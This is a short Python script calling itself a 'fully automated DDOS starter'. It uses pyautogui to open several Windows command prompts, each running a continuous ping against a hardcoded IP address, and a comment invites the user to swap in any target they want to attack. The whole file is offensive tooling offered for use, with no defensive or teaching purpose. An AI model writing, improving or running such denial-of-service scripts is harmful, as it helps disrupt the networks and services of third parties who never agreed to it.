# Blizzard
# A fully automated DDOS starter for Python


import pyautogui     # Make sure you have me! If not, do pip install pyautogui
import time     


IP_TO_DDOS = "104.18.36.114"     # Replace me with the IP you want to DDOS
CMDS_TO_OPEN = 3    # Replace me with the amount of CMDs to open.
DELAY_IN_SECS = 0.2  # Replace me with the time to wait before typing in the CMD. Make higher for slower computers!

commandString = str("ping " + IP_TO_DDOS + " -t")


for i in range(CMDS_TO_OPEN):
    
    pyautogui.hotkey("winleft", "r")
        
    pyautogui.typewrite("cmd")
    pyautogui.press("enter")
    time.sleep(DELAY_IN_SECS)
    
    pyautogui.typewrite(commandString)
        
    pyautogui.press("enter")



